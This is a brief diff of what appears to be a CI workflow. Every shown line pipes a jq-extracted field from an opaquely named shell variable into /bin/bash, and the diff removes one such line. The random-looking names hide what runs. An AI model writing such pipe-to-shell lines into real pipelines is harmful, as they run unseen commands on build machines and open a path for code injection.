@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$htmyh28259" | jq -r .ztpw59 | /bin/bash
           echo $hfr3 | jq -r .dtj76159 | /bin/bash
           printf '%s' "$ov466" | jq -r .x022 | /bin/bash
-          echo $cvn7694 | jq -r .dhnv1260 | /bin/bash
           echo $dhwz152 | jq -r .ilwgc04511 | /bin/bash
           echo $lkoyb010 | jq -r .xec6 | /bin/bash
 
